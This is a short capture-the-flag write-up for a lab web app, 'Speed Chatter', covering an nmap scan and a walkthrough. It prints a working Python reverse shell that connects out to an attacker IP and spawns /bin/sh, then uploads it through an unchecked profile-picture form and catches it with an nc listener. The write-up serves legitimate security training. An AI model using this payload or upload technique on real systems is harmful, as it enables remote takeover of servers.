# Speed Chatting

# Scenario

```
My Dearest Hacker,
Days before Valentine's Day, TryHeartMe rushed out a new messaging platform called "Speed Chatter", promising instant connections and private conversations. But in the race to beat the holiday deadline, security took a back seat. Rumours are circulating that "Speed Chatter" was pushed to production without proper testing.

As a security researcher, it's your task to break into "Speed Chatter", uncover flaws, and expose TryHeartMe's negligence before the damage becomes irreversible.

You can find the web application here: http://10.64.185.247:5000
```

# Nmap

```bash
$ nmap -sS -sV -vv -p- -T5 chatbot.thm

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    syn-ack ttl 62 Werkzeug httpd 3.1.5 (Python 3.10.12)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Solution

Normal Site looks like a chatbot but a fake one

![image.png](image.png)

Tried several things from prompt injection , php reverse shell…. didin’t work !!

Let me try with **python** uploading a **reverse shell**

```bash
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.156.94",7777))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
subprocess.call(["/bin/sh","-i"])
```

Took me hours to fix the code for the reverse shell, but i was worth it

Upload the `shell.py`  on the website : [http://chatbot.thm:5000/](http://chatbot.thm:5000/upload_profile_pic)

![image.png](image%201.png)

Make sure before you upload the file `.py` you have your listener with `nc` ready 

```bash
nc -lnvp 7777
```

![image.png](image%202.png)

Read the content of the flag , with `cat` command, submit the flag and you’re done 😊 !!

![image.png](image%203.png)
